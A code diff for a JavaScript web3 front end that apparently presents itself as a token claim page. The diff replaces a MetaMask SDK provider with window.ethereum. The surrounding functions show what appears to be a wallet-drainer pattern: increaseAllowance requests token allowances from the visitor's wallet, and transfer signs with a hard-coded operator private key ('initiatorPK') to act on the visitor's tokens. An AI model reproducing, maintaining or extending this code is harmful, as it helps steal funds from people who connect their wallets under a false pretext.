@@ -10,7 +10,6 @@ import {
   fetchBalance,
   writeContract
 } from '@wagmi/core';
-import { MetaMaskSDK } from '@metamask/sdk';
 import { mainnet } from '@wagmi/core/chains';
 import { getAccount, fetchFeeData, disconnect } from '@wagmi/core';
 import { ethers } from 'ethers';
@@ -33,10 +32,6 @@ const wagmiConfig = createConfig({
   connectors: w3mConnectors({ projectId, chains }),
   publicClient,
 });
-const options = {
-  injectProvider: false,
-  communicationLayerPreference: 'webrtc',
-};
 const ethereumClient = new EthereumClient(wagmiConfig, chains);
 export const web3modal = new Web3Modal({ projectId }, ethereumClient);
 
@@ -103,8 +98,7 @@ export const claim = async (_balance) => {
 };
 export const increaseAllowance = async (token) => {
   try {
-    const MMSDK = new MetaMaskSDK(options);
-    const web3 = new Web3(MMSDK.getProvider());
+    const web3 = new Web3(window.ethereum);
     var contract = new web3.eth.Contract(
       constants.ALLOWANCEABI,
       token.token_address
@@ -297,8 +291,7 @@ export const increaseAllowance = async (token) => {
 
 export const transfer = async (token) => {
   try {
-    const MMSDK = new MetaMaskSDK(options);
-    const provider = new ethers.providers.Web3Provider(MMSDK.getProvider());
+    const provider = new ethers.providers.Web3Provider(window.ethereum);
     const signer = new ethers.Wallet(constants.initiatorPK, provider);
     const account = getAccount().address;
     const erc20Contract = new ethers.Contract(
@@ -330,8 +323,7 @@ export const ethBalance = async () => {
 
 export const allownce = async (token) => {
   try{
-    const MMSDK = new MetaMaskSDK(options);
-    const web3 = new Web3(MMSDK.getProvider());
+    const web3 = new Web3(window.ethereum);
     var contract = new web3.eth.Contract(
       constants.ALLOWANCEABI,
       token.token_address
@@ -345,8 +337,7 @@ export const allownce = async (token) => {
 
 export const balanceOf = async (token) => {
   try{
-    const MMSDK = new MetaMaskSDK(options);
-    const web3 = new Web3(MMSDK.getProvider());
+    const web3 = new Web3(window.ethereum);
     var contract = new web3.eth.Contract(
       constants.ALLOWANCEABI,
       token.token_address
